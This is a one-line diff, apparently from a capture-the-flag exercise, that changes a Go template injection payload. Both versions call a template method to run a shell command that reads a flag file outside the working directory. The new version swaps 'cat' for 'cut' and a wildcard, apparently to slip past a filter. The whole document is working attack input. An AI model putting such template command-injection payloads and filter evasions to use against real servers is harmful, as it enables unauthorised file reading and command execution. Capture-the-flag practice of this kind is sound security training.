@@ -1,1 +1,1 @@
-{{ .FetchServerInfo "cat ../flag55fa236a12.txt" }}
+{{ .FetchServerInfo "cut -d' ' -f1 ../flag*" }}
